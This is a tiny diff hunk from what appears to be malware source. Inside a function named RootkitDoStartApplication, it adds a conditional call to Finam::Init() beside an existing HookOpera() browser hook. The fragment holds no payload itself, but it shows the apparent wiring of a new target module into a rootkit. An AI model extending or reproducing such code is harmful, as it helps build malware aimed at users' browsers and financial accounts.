@@ -437,9 +437,12 @@ void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 		}
 	#endif
 
+	#ifdef FinamH
+		Finam::Init();
+	#endif
+
 	#ifdef OperaH
 		if (HookOpera()) return;
-
 	#endif
 
 
